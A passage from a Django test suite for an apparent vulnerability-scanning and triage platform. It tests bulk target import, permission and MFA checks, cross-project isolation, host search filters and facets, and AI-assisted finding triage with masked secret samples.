		from agentapi.services import has_org_headers, parse_org_text
		org, groups, errors = parse_org_text('stray.example\n##Acme\n#Web\na.com\n10.0.0.1, b.com\n#Ops\nc.com # note\n#web\na.com\nd.com\n##Other')
		self.assertEqual(org, 'Acme')
		self.assertEqual(groups, [('Web', ['a.com', '10.0.0.1', 'b.com', 'd.com']), ('Ops', ['c.com'])])
		self.assertEqual([e['value'] for e in errors], ['stray.example', '##Other'])
		# no ##Org: still groups; "# comment" (hash + space) is a comment; entries above a header go to the default project
		org, groups, errors = parse_org_text('top.example\n# just a note\n#Web\na.com', default_project='Current')
		self.assertEqual((org, groups, errors), (None, [('Current', ['top.example']), ('Web', ['a.com'])], []))
		self.assertTrue(has_org_headers('#Widgets\na.com'))
		self.assertFalse(has_org_headers('# only a comment\na.com'))

	def test_bulk_by_org_creates_projects_checks_permissions(self):
		admin = User.objects.create_user('orgadmin', password='x')
		org = Org.objects.create(name='Acme', slug='acme')
		OrgMembership.objects.create(user=admin, org=org, role='admin')
		existing = Project.objects.create(name='Web', slug='acme-web', insert_date=timezone.now(), org=org)
		_, tok = create_token(admin, 'oa')
		text = '##Acme\n#Web\na.example\n#New Project\nb.example\n203.0.113.7'
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(tok, 'POST', '/api/v1/targets/bulk-org', {'text': text, 'mode': 'passive'})
		self.assertEqual(status, 201)
		self.assertEqual((data['created'], data['projects_created'], data['discovery_started']), (3, 1, 3))
		self.assertEqual(queued.call_count, 3)
		new = Project.objects.get(org=org, name='New Project')
		self.assertEqual(sorted(Domain.objects.filter(project=new).values_list('name', flat=True)), ['203.0.113.7', 'b.example'])
		self.assertEqual(list(Domain.objects.filter(project=existing).values_list('name', flat=True)), ['a.example'])
		# an organization that does not exist is never created: the caller's current organization is used instead
		status, data = call(tok, 'POST', '/api/v1/targets/bulk-org', {'text': '##Nope\n#Proj\nx.example', 'discover': False, 'current_project': 'acme-web'})
		self.assertEqual((status, data['organization']), (201, 'Acme'))
		self.assertIn('does not exist', data['organization_note'])
		self.assertFalse(Org.objects.filter(name='Nope').exists())
		self.assertTrue(Project.objects.filter(org=org, name='Proj').exists(), data)
		# no ##Org line at all: same org, no note; targets above any header go to the project being viewed
		status, data = call(tok, 'POST', '/api/v1/targets/bulk-org', {'text': 'top.example\n#Quu\ny.example', 'discover': False, 'current_project': 'acme-web'})
		self.assertEqual((status, data['organization'], data['organization_note']), (201, 'Acme', None))
		self.assertEqual(list(Domain.objects.filter(project=existing, name='top.example').values_list('name', flat=True)), ['top.example'])
		# an org the caller cannot see behaves like a missing one: their own org, nothing leaks
		status, data = call(self.tok, 'POST', '/api/v1/targets/bulk-org', {'text': '##Acme\n#Web\nx.example', 'discover': False})
		self.assertEqual((status, data['organization']), (201, 'B1'))
		self.assertIn('admin role', data['projects'][0]['error'])  # a user-role member cannot create projects in B1
		self.assertEqual(Domain.objects.filter(name='x.example', project=existing).count(), 0)

	def test_bulk_by_org_user_role_cannot_create_projects_but_can_add(self):
		user = User.objects.create_user('orguser', password='x')
		org = Org.objects.create(name='Beta', slug='beta')
		OrgMembership.objects.create(user=user, org=org, role='user')
		Project.objects.create(name='Have', slug='beta-have', insert_date=timezone.now(), org=org)
		_, tok = create_token(user, 'ou')
		status, data = call(tok, 'POST', '/api/v1/targets/bulk-org', {'text': '##Beta\n#Have\na.example\n#Missing\nb.example', 'discover': False})
		self.assertEqual(status, 201)
		by = {p['project']: p for p in data['projects']}
		self.assertEqual(by['Have']['created'], 1)
		self.assertIn('admin role', by['Missing']['error'])
		self.assertFalse(Project.objects.filter(org=org, name='Missing').exists())
		_, ro = create_token(user, 'ro', read_only=True)
		self.assertEqual(call(ro, 'POST', '/api/v1/targets/bulk-org', {'text': '##Beta\n#Have\nz.example'})[0], 403)

	def test_delete_targets_by_ids_and_by_search(self):
		now = timezone.now()
		mine = [Domain.objects.create(name=f'del{i}.example', project=self.pa, insert_date=now) for i in range(4)]
		theirs = Domain.objects.create(name='keep.example', project=self.pb, insert_date=now)
		url = '/api/v1/projects/ba/targets/delete'
		status, data = call(self.tok, 'POST', url, {'ids': [mine[0].id, mine[1].id, theirs.id]})  # another project's id is ignored
		self.assertEqual((status, data['deleted']), (200, 2))
		self.assertTrue(Domain.objects.filter(pk=theirs.pk).exists())
		self.assertEqual(Domain.objects.filter(project=self.pa, name__startswith='del').count(), 2)
		status, data = call(self.tok, 'POST', url, {'all_matching': True, 'q': 'del2'})
		self.assertEqual(data['deleted'], 1)
		remaining = Domain.objects.filter(project=self.pa).count()
		status, data = call(self.tok, 'POST', url, {'all_matching': True})
		self.assertEqual(data['deleted'], remaining)
		self.assertEqual(Domain.objects.filter(project=self.pa).count(), 0)
		self.assertTrue(Domain.objects.filter(pk=theirs.pk).exists())
		self.assertTrue(AuditLog.objects.filter(action='targets.delete').exists())

	def test_delete_targets_needs_a_selection_and_write_access(self):
		url = '/api/v1/projects/ba/targets/delete'
		self.assertEqual(call(self.tok, 'POST', url, {})[0], 400)
		self.assertEqual(call(self.tok, 'POST', url, {'ids': []})[0], 400)
		self.assertEqual(call(self.tok, 'POST', url, {'ids': ['x']})[0], 400)
		self.assertEqual(call(self.tok_audit, 'POST', url, {'all_matching': True})[0], 403)
		self.assertEqual(call(self.tok, 'POST', '/api/v1/projects/bb/targets/delete', {'all_matching': True})[0], 404)

	def test_discover_single_target_and_mcp_tool(self):
		d = Domain.objects.create(name='single.example', project=self.pa, insert_date=timezone.now())
		with mock.patch('cveFeed.tasks.run_bbot_discovery.delay') as queued:
			status, data = call(self.tok, 'POST', f'/api/v1/projects/ba/targets/{d.id}/discover', {})
			self.assertEqual(status, 202)
			queued.assert_called_once_with(data['scan_id'], 'standard')
			status, data = rpc(self.tok, 'tools/call', {'name': 'add_targets', 'arguments': {'project': 'ba', 'targets': ['mcp.example'], 'mode': 'passive'}})
			self.assertFalse(data['result']['isError'])
		self.assertEqual(call(self.tok_audit, 'POST', f'/api/v1/projects/ba/targets/{d.id}/discover', {})[0], 403)
		self.assertEqual(call(self.tok, 'POST', '/api/v1/projects/ba/targets/999999/discover', {})[0], 404)


class HostSearchTests(TestCase):
	@classmethod
	def setUpTestData(cls):
		from startScan.models import Technology
		now = timezone.now()
		org = Org.objects.create(name='SO', slug='so')
		cls.pa = Project.objects.create(name='SA', slug='srch-a', insert_date=now, org=org)
		cls.pb = Project.objects.create(name='SB', slug='srch-b', insert_date=now, org=org)
		cls.user = User.objects.create_user('searcher', password='x')
		ProjectMembership.objects.create(user=cls.user, project=cls.pa, role='user')
		_, cls.tok = create_token(cls.user, 's')
		da, db = (Domain.objects.create(name=n, project=p, insert_date=now) for n, p in (('srch.example', cls.pa), ('other.example', cls.pb)))

		def host(domain, name, ip=None, tech=None, port=None, os=None, title=None):
			sub = Subdomain.objects.create(name=name, target_domain=domain, page_title=title)
			if tech:
				sub.technologies.add(Technology.objects.get_or_create(name=tech)[0])
			if ip:
				addr = IpAddress.objects.get_or_create(address=ip, defaults={'os_guess': os or ''})[0]
				sub.ip_addresses.add(addr)
				if port:
					number, product, version = port
					addr.ports.add(Port.objects.create(number=number, product=product, version=version, service_name='svc'))
			return sub
		host(da, 'tech.srch.example', ip='10.0.0.2', tech='PHP:8.1')
		host(da, 'port.srch.example', ip='10.0.0.3', port=(8080, 'PHP', '7.4'), os='Linux 5.X')
		host(da, 'db.srch.example', ip='10.0.0.5', port=(3306, 'MySQL', '8.0'))
		host(da, 'www.srch.example', ip='10.0.1.9', tech='PHP', title='Welcome to Acme Tomcat')
		host(db, 'theirs.other.example', ip='10.0.0.7', tech='PHP', port=(3306, 'MySQL', '8.0'))

	def search(self, q, **extra):
		from urllib.parse import urlencode
		status, data = call(self.tok, 'GET', '/api/v1/projects/srch-a/search?' + urlencode({'q': q, **extra}))
		self.assertEqual(status, 200, data)
		return data

	def names(self, q, **extra):
		return sorted(h['host'] for h in self.search(q, **extra)['results'])

	def test_a_bare_word_matches_a_technology_and_a_port_product(self):
		self.assertEqual(self.names('php'), ['port.srch.example', 'tech.srch.example', 'www.srch.example'])
		why = {h['host']: h['matched'] for h in self.search('php')['results']}
		self.assertEqual(why['tech.srch.example'], ['technology PHP:8.1'])
		self.assertEqual(why['port.srch.example'], ['port 8080 PHP 7.4'])

	def test_a_bare_word_also_covers_hostname_ip_os_title_and_is_case_insensitive(self):
		self.assertEqual(self.names('DB.SRCH'), ['db.srch.example'])
		self.assertEqual(self.names('10.0.0.5'), ['db.srch.example'])
		self.assertEqual(self.names('linux'), ['port.srch.example'])
		self.assertEqual(self.names('tomcat'), ['www.srch.example'])

	def test_field_filters(self):
		self.assertEqual(self.names('port:3306'), ['db.srch.example'])  # only that host, not the other project's
		self.assertEqual(self.names('product:mysql'), ['db.srch.example'])
		self.assertEqual(self.names('tech:php'), ['port.srch.example', 'tech.srch.example', 'www.srch.example'])  # tech: is everything a host runs
		self.assertEqual(self.names('os:"linux 5"'), ['port.srch.example'])
		self.assertEqual(self.names('service:svc port:8080'), ['port.srch.example'])  # terms are ANDed

	def test_negation_and_phrases(self):
		self.assertEqual(self.names('tech:php -host:www'), ['port.srch.example', 'tech.srch.example'])
		self.assertEqual(self.names('-php'), ['db.srch.example'])
		self.assertEqual(self.names('"welcome to acme"'), ['www.srch.example'])
		self.assertEqual(self.names('welcome acme'), ['www.srch.example'])

	def test_ip_matches_an_address_or_a_cidr(self):
		self.assertEqual(self.names('ip:10.0.0.0/24'), ['db.srch.example', 'port.srch.example', 'tech.srch.example'])
		self.assertEqual(self.names('ip:10.0.1.0/24'), ['www.srch.example'])
		self.assertEqual(self.names('ip:10.0.0.3'), ['port.srch.example'])
		self.assertEqual(self.names('ip:10.0.0.0/24 -port:3306'), ['port.srch.example', 'tech.srch.example'])

	def test_another_projects_hosts_are_never_returned_and_findings_and_cves_search(self):
		from startScan.models import Vulnerability
		sub = Subdomain.objects.get(name='db.srch.example')
		Vulnerability.objects.create(name='Exposed MySQL', severity=3, subdomain=sub, target_domain=sub.target_domain, http_url='x', open_status=True)
		cve = CVEEntry.objects.create(cve_id='CVE-2099-42', cvss=8.0, published_at=timezone.now())
		CVEMatch.objects.create(cve_entry=cve, subdomain=Subdomain.objects.get(name='www.srch.example'), confidence=0.9)
		self.assertNotIn('theirs.other.example', self.names(''))
		self.assertEqual(self.names('vuln:exposed'), ['db.srch.example'])
		self.assertEqual(self.names('sev:high'), ['db.srch.example'])
		self.assertEqual(self.names('cve:2099-42'), ['www.srch.example'])
		self.assertEqual(self.names('exposed'), ['db.srch.example'])
		status, _ = call(self.tok, 'GET', '/api/v1/projects/srch-b/search?q=php')
		self.assertEqual(status, 404)  # not a member

	def test_results_are_paginated_and_bad_queries_are_400(self):
		data = self.search('', page_size=2)
		self.assertEqual((data['count'], len(data['results']), data['page_size']), (4, 2, 2))
		for q in ('port:abc', 'sev:nope', 'ip:1.2.3.4/99'):
			status, body = call(self.tok, 'GET', '/api/v1/projects/srch-a/search?q=' + q.replace('/', '%2F'))
			self.assertEqual(status, 400, q)

	def test_heat_facets_count_the_whole_match_and_heat_filters_the_page(self):
		from startScan.models import ScanActivity, ScanHistory, Vulnerability
		from scanEngine.models import EngineType
		fire = Subdomain.objects.get(name='port.srch.example')
		Vulnerability.objects.create(name='RCE', severity=3, subdomain=fire, target_domain=fire.target_domain, http_url='x', open_status=True)
		ice = Subdomain.objects.get(name='tech.srch.example')
		Vulnerability.objects.create(name='Info leak', severity=1, subdomain=ice, target_domain=ice.target_domain, http_url='y', open_status=True)
		clean = Subdomain.objects.get(name='db.srch.example')
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='x')
		scan = ScanHistory.objects.create(domain=clean.target_domain, scan_type=engine, start_scan_date=timezone.now(), scan_status=2)
		clean.scan_history = scan
		clean.save(update_fields=['scan_history'])
		ScanActivity.objects.create(scan_of=scan, name='nuclei_scan', status=2, time=timezone.now())
		# www.srch.example stays unscanned: no findings, no nuclei activity
		data = self.search('')
		self.assertEqual(data['facets']['heat'], {'fire': 1, 'smoke': 0, 'ice': 1, 'clean': 1, 'unscanned': 1})
		self.assertFalse(data['facets']['truncated'])
		self.assertEqual(self.names('', heat='fire'), ['port.srch.example'])
		self.assertEqual(self.names('', heat='unscanned'), ['www.srch.example'])
		# the facet counts hold steady even while narrowed to one heat value
		self.assertEqual(self.search('', heat='fire')['facets']['heat'], {'fire': 1, 'smoke': 0, 'ice': 1, 'clean': 1, 'unscanned': 1})
		status, _ = call(self.tok, 'GET', '/api/v1/projects/srch-a/search?q=&heat=bogus')
		self.assertEqual(status, 400)

	def test_a_light_only_nuclei_pass_counts_as_scanned_not_unscanned(self):
		# Most hosts only ever get the light pass (the AI-targeted pass is gated on there being something worth
		# targeting), so this is the common real-world case, not an edge case: it must read 'clean', not 'unscanned'.
		from startScan.models import ScanActivity, ScanHistory
		from scanEngine.models import EngineType
		from agentapi.services import _host_heat
		sub = Subdomain.objects.get(name='db.srch.example')
		engine = EngineType.objects.create(engine_name='e-light', yaml_configuration='x')
		scan = ScanHistory.objects.create(domain=sub.target_domain, scan_type=engine, start_scan_date=timezone.now(), scan_status=2)
		sub.scan_history = scan
		sub.save(update_fields=['scan_history'])
		ScanActivity.objects.create(scan_of=scan, name='nuclei_light_scan', status=2, time=timezone.now())
		self.assertEqual(_host_heat(sub), 'clean')

	def test_the_search_is_an_mcp_tool(self):
		status, data = rpc(self.tok, 'tools/call', {'name': 'search_hosts', 'arguments': {'project': 'srch-a', 'q': 'port:3306'}})
		self.assertEqual(status, 200)
		self.assertIn('db.srch.example', json.dumps(data))

	def test_comma_is_or_within_one_filter_but_not_when_quoted(self):
		self.assertEqual(self.names('port:3306,8080'), ['db.srch.example', 'port.srch.example'])
		self.assertEqual(self.names('product:php,mysql'), ['db.srch.example', 'port.srch.example'])
		# quoting a value with a comma keeps it literal, so port: (which takes a bare number) 400s instead of splitting it
		status, _ = call(self.tok, 'GET', '/api/v1/projects/srch-a/search?q=' + 'port:"3306,8080"'.replace(',', '%2C').replace('"', '%22'))
		self.assertEqual(status, 400)

	def test_country_filters_and_shows_in_matched(self):
		from startScan.models import CountryISO
		us, _ = CountryISO.objects.get_or_create(iso='US', name='United States')
		de, _ = CountryISO.objects.get_or_create(iso='DE', name='Germany')
		IpAddress.objects.filter(address='10.0.0.5').update(geo_iso=us)
		IpAddress.objects.filter(address='10.0.0.3').update(geo_iso=de)
		self.assertEqual(self.names('country:US'), ['db.srch.example'])
		self.assertEqual(self.names('country:Germany'), ['port.srch.example'])
		why = {h['host']: h['matched'] for h in self.search('country:us')['results']}
		self.assertEqual(why['db.srch.example'], ['country United States'])

	def test_facets_count_the_whole_match_like_heat_does(self):
		data = self.search('', facets='port,product,os')
		self.assertEqual(sorted(data['facets']['port'], key=lambda r: r['value']),
		                  sorted([{'value': 8080, 'count': 1}, {'value': 3306, 'count': 1}], key=lambda r: r['value']))
		self.assertIn({'value': 'MySQL', 'count': 1}, data['facets']['product'])
		self.assertIn({'value': 'Linux 5.X', 'count': 1}, data['facets']['os'])
		# the same counts hold while the page is narrowed, exactly like facets.heat
		narrowed = self.search('', heat='clean', facets='port')
		self.assertEqual(sorted(narrowed['facets']['port'], key=lambda r: r['value']), sorted(data['facets']['port'], key=lambda r: r['value']))

	def test_facet_size_bounds_and_bad_facet_name_is_400(self):
		data = self.search('', facets='port', facet_size=1)
		self.assertEqual(len(data['facets']['port']), 1)
		status, _ = call(self.tok, 'GET', '/api/v1/projects/srch-a/search?q=&facets=bogus')
		self.assertEqual(status, 400)



class AgentApiMfaTests(TestCase):
	"""Org.require_mfa is also enforced on /api/v1/ and /mcp/, which the tenancy middleware skips."""

	def setUp(self):
		self.org = Org.objects.create(name='Strict', slug='strict', require_mfa=True)
		self.open_org = Org.objects.create(name='Open', slug='open')
		self.user = User.objects.create_user('mfauser', password='x')
		OrgMembership.objects.create(user=self.user, org=self.org, role='admin')

	def _mint(self, user):
		return client_for(user).post('/api/v1/tokens', json.dumps({'name': 'new'}), content_type='application/json')

	def test_unenrolled_member_cannot_mint_a_token(self):
		from dashboard.models import ApiToken
		r = self._mint(self.user)
		self.assertEqual(r.status_code, 403)
		self.assertIn('MFA', r.json()['error'])
		self.assertFalse(ApiToken.objects.filter(user=self.user).exists())

	def test_session_api_and_mcp_requests_are_blocked_until_enrolled(self):
		c = client_for(self.user)
		self.assertEqual(c.get('/api/v1/me').status_code, 403)
		self.assertEqual(c.post('/mcp/', json.dumps({'jsonrpc': '2.0', 'id': 1, 'method': 'ping'}),
			content_type='application/json').status_code, 403)

	def test_enrolled_member_can_mint_a_token(self):
		from dashboard.models import UserProfile
		UserProfile.objects.update_or_create(user=self.user, defaults={'mfa_enabled': True})
		r = self._mint(User.objects.get(pk=self.user.pk))
		self.assertEqual(r.status_code, 201)
		self.assertEqual(client_for(self.user).get('/api/v1/me').status_code, 200)

	def test_org_without_the_requirement_is_unaffected(self):
		other = User.objects.create_user('plain', password='x')
		OrgMembership.objects.create(user=other, org=self.open_org, role='admin')
		self.assertEqual(self._mint(other).status_code, 201)

	def test_existing_token_of_unenrolled_member_stops_until_enrolled(self):
		from dashboard.models import UserProfile
		_, raw = create_token(self.user, 'old')
		status, body = call(raw, 'GET', '/api/v1/me')
		self.assertEqual(status, 403)
		self.assertIn('MFA', body['error'])
		UserProfile.objects.update_or_create(user=self.user, defaults={'mfa_enabled': True})
		self.assertEqual(call(raw, 'GET', '/api/v1/me')[0], 200)


class TriageApiTests(TestCase):
	"""The triage fields on the list endpoints, the finding detail, the triage list and retriage."""

	@classmethod
	def setUpTestData(cls):
		from cveFeed.models import HygieneFinding, RouteAuth
		from startScan.models import Vulnerability
		now = timezone.now()
		org1, org2 = Org.objects.create(name='One', slug='one'), Org.objects.create(name='Two', slug='two')
		cls.pa = Project.objects.create(name='A', slug='proj-a', insert_date=now, org=org1)
		cls.pb = Project.objects.create(name='B', slug='proj-b', insert_date=now, org=org2)
		cls.da = Domain.objects.create(name='a.example', project=cls.pa, insert_date=now)
		cls.db = Domain.objects.create(name='b.example', project=cls.pb, insert_date=now)
		mk = lambda n: User.objects.create_user(n, password='x')
		cls.alice, cls.carol = mk('alice'), mk('carol')
		ProjectMembership.objects.create(user=cls.alice, project=cls.pa, role='user')
		ProjectMembership.objects.create(user=cls.carol, project=cls.pa, role='audit')
		_, cls.t_alice = create_token(cls.alice, 'agent')
		_, cls.t_ro = create_token(cls.alice, 'readonly', read_only=True)
		_, cls.t_carol = create_token(cls.carol, 'auditor')
		cls.sub = Subdomain.objects.create(name='www.a.example', target_domain=cls.da)
		ip = IpAddress.objects.create(address='203.0.113.5')
		cls.sub.ip_addresses.add(ip)
		ip.ports.add(Port.objects.create(number=443, product='nginx', version='1.18.0', service_name='https'))
		cls.cve = CVEEntry.objects.create(cve_id='CVE-2099-1', kev=True, cvss=9.8, title='nginx bug', published_at=now,
			affected=[{'product': 'nginx', 'ranges': [{'introduced': '1.0.0', 'fixed': '1.20.0'}]}])
		cls.match = CVEMatch.objects.create(cve_entry=cls.cve, subdomain=cls.sub, confidence=0.9, matched_product='nginx', matched_version='1.18.0',
			version_in_range=True, source='port', evidence={'ip': '203.0.113.5', 'port': 443, 'range': {'introduced': '1.0.0', 'fixed': '1.20.0'}})
		cls.fp_match = CVEMatch.objects.create(cve_entry=cls.cve, subdomain=cls.sub, confidence=0.5, matched_product='openresty', matched_version='',
			version_in_range=None, source='tech')
		other = Subdomain.objects.create(name='www.b.example', target_domain=cls.db)
		cls.match_b = CVEMatch.objects.create(cve_entry=cls.cve, subdomain=other, confidence=0.9, matched_product='nginx', matched_version='1.18.0',
			version_in_range=True, source='port')
		cls.vuln = Vulnerability.objects.create(target_domain=cls.da, subdomain=cls.sub, source='nuclei', name='Exposed panel', severity=3,
			template_id='exposed-panel', matcher_name='word', http_url='https://www.a.example/admin', description='An admin panel.',
			request='GET /SECRET-REQUEST HTTP/1.1', response='HTTP/1.1 200 OK\r\n\r\nSECRET-BODY', discovered_date=now)
		cls.bbot = Vulnerability.objects.create(target_domain=cls.da, subdomain=cls.sub, source='bbot', name='Heuristic thing', severity=1,
			template_id='badsecrets', http_url='https://www.a.example/', discovered_date=now)
		cls.vuln_b = Vulnerability.objects.create(target_domain=cls.db, subdomain=other, source='nuclei', name='B panel', severity=3,
			template_id='x', http_url='https://www.b.example/', discovered_date=now)
		cls.route = RouteAuth.objects.create(project=cls.pa, domain=cls.da, host='www.a.example', url='https://www.a.example/admin/', path='/admin/',
			auth_state='open', http_status=200, sensitive={'aws_key': {'count': 1, 'sample': 'AKIA***LE'}}, sensitive_score=40)
		cls.hyg = HygieneFinding.objects.create(domain=cls.da, host='www.a.example', check_name='spf_missing', severity=2, title='No SPF')

	def triaged(self, reply='likely_false_positive'):
		from cveFeed import triage
		provider = mock.Mock(model='m')
		provider.name = 'anthropic'
		provider.complete.return_value = json.dumps({'classification': reply, 'reason': 'because', 'impact': 'attackers get a foothold',
			'severity_adjust': 0, 'severity_reason': '', 'remediation': 'Upgrade nginx.', 'validation_steps': []})
		with mock.patch('cveFeed.activity.log', return_value=None):
			findings = triage.with_cves(CVEMatch.objects.filter(subdomain__target_domain=self.da).select_related('subdomain__target_domain'))
			findings += triage.vulnerabilities(__import__('startScan.models', fromlist=['Vulnerability']).Vulnerability.objects.filter(target_domain=self.da))
			findings += [self.route, self.hyg]
			triage.run_triage(triage.track(findings), provider=provider)

	def get(self, path, token=None):
		return call(token or self.t_alice, 'GET', f'/api/v1/projects/proj-a/{path}')

	def test_cross_project_ids_are_404(self):
		self.triaged()
		for kind, pk in (('match', self.match_b.id), ('vulnerability', self.vuln_b.id)):
			self.assertEqual(call(self.t_alice, 'GET', f'/api/v1/projects/proj-b/findings/{kind}/{pk}')[0], 404)  # not her project
			self.assertEqual(self.get(f'findings/{kind}/{pk}')[0], 404)  # B's id through A
			self.assertEqual(call(self.t_alice, 'POST', f'/api/v1/projects/proj-a/findings/{kind}/{pk}/retriage')[0], 404)
		self.assertEqual(call(self.t_alice, 'GET', '/api/v1/projects/proj-b/triage')[0], 404)
		self.assertEqual(self.get('findings/bogus/1')[0], 404)
		self.assertEqual(self.get('findings/match/999999')[0], 404)

	def test_lists_carry_the_triage_badge_and_closed_candidates_keep_history(self):
		self.triaged('likely_false_positive')
		status, data = self.get('vulnerabilities')
		by_name = {v['name']: v for v in data['results']}
		self.assertEqual(by_name['Exposed panel']['triage']['classification'], 'confirmed')  # a matcher fired: the floor
		self.assertEqual(by_name['Heuristic thing']['triage']['classification'], 'likely_false_positive')  # listed, not hidden
		self.assertIsNotNone(by_name['Heuristic thing']['triage']['first_seen'])
		status, data = self.get('matches')
		by_id = {m['id']: m for m in data['results']}
		self.assertEqual(by_id[self.match.id]['triage']['classification'], 'needs_validation')  # in range: never cleared
		self.assertEqual(by_id[self.fp_match.id]['triage']['classification'], 'not_applicable')
		self.assertEqual(by_id[self.fp_match.id]['ai_verdict'], 'not_affected')  # the legacy view
		self.assertIn(self.fp_match.id, by_id)
		self.assertEqual(self.get('routes')[1]['results'][0]['triage']['classification'], 'confirmed')
		self.assertEqual(self.get('hygiene')[1]['results'][0]['triage']['classification'], 'confirmed')

	def test_work_items_exclude_closed_candidates(self):
		self.triaged('likely_false_positive')
		ids = {i['id'] for i in self.get('work')[1]['results']}
		self.assertNotIn(self.fp_match.id, ids)
		self.assertIn(self.match.id, ids)
		ids = {i['id'] for i in self.get('work?include_fp=0')[1]['results']}
		self.assertNotIn(self.fp_match.id, ids)
		self.assertIn(self.match.id, ids)

	def test_work_items_still_skip_a_match_cleared_without_a_triage_verdict(self):
		CVEMatch.objects.filter(pk=self.fp_match.pk).update(ai_verdict='not_affected')
		self.assertNotIn(self.fp_match.id, {i['id'] for i in self.get('work')[1]['results']})

	def test_detail_of_a_match(self):
		self.triaged('likely_false_positive')
		status, d = self.get(f'findings/match/{self.match.id}')
		self.assertEqual(status, 200)
		self.assertEqual((d['kind'], d['host'], d['target'], d['severity']), ('match', 'www.a.example', 'a.example', 'critical'))
		self.assertEqual(d['why_it_matters'], 'attackers get a foothold')
		self.assertEqual(d['confidence'], self.match.confidence)
		self.assertEqual(d['ai']['classification'], 'needs_validation')
		self.assertTrue(d['ai']['overridden'])
		self.assertEqual((d['ai']['model_classification'], d['ai']['model_reason']), ('likely_false_positive', 'because'))  # the model's own words
		self.assertIn('the version found is inside the affected range', d['ai']['hard_evidence'])
		labels = [s['label'] for s in d['how_found']['steps']]
		for label in ('Observed', 'Found by', 'Advisory range', 'Version check', 'Template check'):
			self.assertIn(label, labels)
		self.assertEqual(d['remediation']['text'], 'Upgrade nginx.')
		self.assertEqual(d['remediation']['fixed_in'], ['1.20.0'])
		self.assertEqual(d['remediation']['status'], 'open')
		self.assertIsNotNone(d['first_seen'])
		self.assertIsNotNone(d['last_seen'])
		self.assertEqual(d['validation']['steps'], [])
		self.assertEqual(d['validation']['status'], 'none')

	def test_detail_shows_every_validation_check_with_its_exact_command_and_result(self):
		from cveFeed.models import Triage
		self.triaged()
		steps = [{'kind': 'nmap_sv', 'label': 'nmap service detection on port 443', 'display': 'nmap -sV --version-intensity 5 -Pn -p 443 203.0.113.5',
			'target': '203.0.113.5:443', 'ran_at': '2026-10-24T10:12:00+00:00', 'result': 'reaffirmed', 'summary': 'nmap reports nginx 1.18.2',
			'output_excerpt': 'https nginx 1.18.2', 'error': ''}]
		Triage.objects.filter(match=self.match).update(validation_status='clean', validation_steps=steps,
			validation_evidence={'nuclei_template': {'request': 'GET /v', 'response': 'HTTP/1.1 200'}})
		d = self.get(f'findings/match/{self.match.id}')[1]
		self.assertEqual(d['validation']['steps'][0]['display'], steps[0]['display'])
		self.assertEqual((d['validation']['status'], d['validation']['steps'][0]['result']), ('observed', 'reaffirmed'))
		self.assertEqual(d['validation']['evidence']['nuclei_template']['request'], 'GET /v')

	def test_detail_of_a_vulnerability_has_excerpts_but_the_list_has_none(self):
		self.triaged()
		d = self.get(f'findings/vulnerability/{self.vuln.id}')[1]
		self.assertIn('SECRET-REQUEST', d['how_found']['excerpts']['request'])
		self.assertIn('SECRET-BODY', d['how_found']['excerpts']['response'])
		self.assertEqual(d['severity'], 'high')
		listed = json.dumps(self.get('vulnerabilities')[1])
		self.assertNotIn('SECRET-REQUEST', listed)
		self.assertNotIn('SECRET-BODY', listed)
		self.assertNotIn('SECRET-BODY', json.dumps(self.get('triage')[1]))

	def test_detail_of_a_route_has_masked_samples_only(self):
		self.triaged()
		d = self.get(f'findings/route/{self.route.id}')[1]
		text = json.dumps(d)
		self.assertIn('aws_key: 1', text)
		self.assertNotIn('AKIAIOSFODNN7EXAMPLE', text)
		self.assertEqual(d['how_found']['excerpts'], {})

	def test_detail_of_hygiene_and_the_host_history(self):
		from cveFeed.models import AssetChange
		AssetChange.objects.create(project=self.pa, domain=self.da, host='www.a.example', kind='service_changed', port=443,
			before={'version': '1.17'}, after={'version': '1.18.0'})
		AssetChange.objects.create(project=self.pa, domain=self.da, host='www.a.example', kind='host_new')  # not a history kind here
		AssetChange.objects.create(project=self.pb, domain=self.db, host='www.a.example', kind='port_opened', port=22)  # another project's
		d = self.get(f'findings/hygiene/{self.hyg.id}')[1]
		self.assertEqual(d['title'], 'No SPF')
		self.assertEqual([c['kind'] for c in d['history']], ['service_changed'])

	def test_an_untriaged_finding_still_has_a_detail(self):
		d = self.get(f'findings/match/{self.match.id}')[1]
		self.assertEqual((d['ai']['classification'], d['ai']['status'], d['why_it_matters']), ('', 'untracked', ''))

	def test_list_triage_filters(self):
		self.triaged('likely_false_positive')
		everything = self.get('triage')[1]
		self.assertEqual(everything['count'], 6)  # two matches, two scanner findings, a route and a hygiene finding
		fp = self.get('triage?classification=likely_false_positive')[1]['results']
		self.assertEqual({r['title'] for r in fp}, {'Heuristic thing'})
		closed = self.get('triage?classification=not_applicable')[1]['results']
		self.assertEqual({r['title'] for r in closed}, {'CVE-2099-1'})
		self.assertTrue(all(r['finding']['id'] for r in fp))
		self.assertEqual(self.get('triage?status=bogus')[0], 400)
		self.assertEqual(self.get('triage?kind=bbot')[1]['count'], 1)

	def test_retriage_needs_a_write_token_and_queues_only_planned_work(self):
		self.triaged()
		path = f'/api/v1/projects/proj-a/findings/match/{self.match.id}/retriage'
		self.assertEqual(call(self.t_ro, 'POST', path)[0], 403)
		self.assertEqual(call(self.t_carol, 'POST', path)[0], 403)
		with mock.patch('cveFeed.tasks.validate_match_on_demand.apply_async') as validate:
			status, data = call(self.t_alice, 'POST', path)
		self.assertEqual((status, data['status']), (202, 'queued'))
		validate.assert_called_once_with(args=[data['id']], priority=3)
		bbot = f'/api/v1/projects/proj-a/findings/vulnerability/{self.bbot.id}/retriage'
		with mock.patch('cveFeed.tasks.automatic_validate_finding.apply_async') as validate, \
				mock.patch('cveFeed.tasks.triage_pending.delay') as sweep:
			status, queued = call(self.t_alice, 'POST', bbot)
			status_again, same = call(self.t_alice, 'POST', bbot)
		self.assertEqual((status, queued['status'], status_again, same['id']), (202, 'queued', 202, queued['id']))
		validate.assert_called_once_with(args=[queued['id']], priority=3)
		sweep.assert_not_called()
		from cveFeed.models import AutomaticValidation
		job = AutomaticValidation.objects.get(pk=queued['id'])
		self.assertEqual((job.project_id, job.source, job.requested_by_id), (self.pa.pk, 'manual', self.alice.pk))

	def test_nonmatch_validation_worker_rechecks_queued_token_authority(self):
		from agentapi.auth import hash_token
		from dashboard.models import ApiToken
		from cveFeed.models import AutomaticValidation
		from cveFeed.tasks import automatic_validate_finding
		path = f'/api/v1/projects/proj-a/findings/vulnerability/{self.bbot.id}/retriage'
		with mock.patch('cveFeed.tasks.automatic_validate_finding.apply_async'):
			status, queued = call(self.t_alice, 'POST', path)
		self.assertEqual(status, 202)
